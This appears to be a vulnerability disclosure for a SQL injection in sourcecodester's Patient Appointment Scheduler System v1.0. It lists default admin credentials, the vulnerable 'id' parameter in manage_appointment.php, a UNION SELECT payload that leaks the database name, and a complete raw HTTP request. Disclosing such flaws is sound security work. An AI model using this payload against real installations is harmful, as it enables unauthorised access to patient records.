# Patient Appointment Scheduler System v1.0 by sourcecodester has SQL injection 2

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/14928/patient-appointment-scheduler-system-using-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /scheduler/admin/appointments/manage_appointment.php

Vulnerability location: /scheduler/admin/appointments/manage_appointment.php?id=, id

dbname = scheduler_db

[+] Payload: /scheduler/admin/appointments/manage_appointment.php?id=0%27%20union%20select%201,2,3,database(),5,6--+ // Leak place ---> id

```sql
GET /scheduler/admin/appointments/manage_appointment.php?id=0%27%20union%20select%201,2,3,database(),5,6--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mjsuoc4jice3ps6orhn4u8t5vk
Connection: close


```

<img width="1067" height="684" alt="image" src="https://github.com/user-attachments/assets/42a3f8dc-dfef-4110-9c86-c07472871743" />
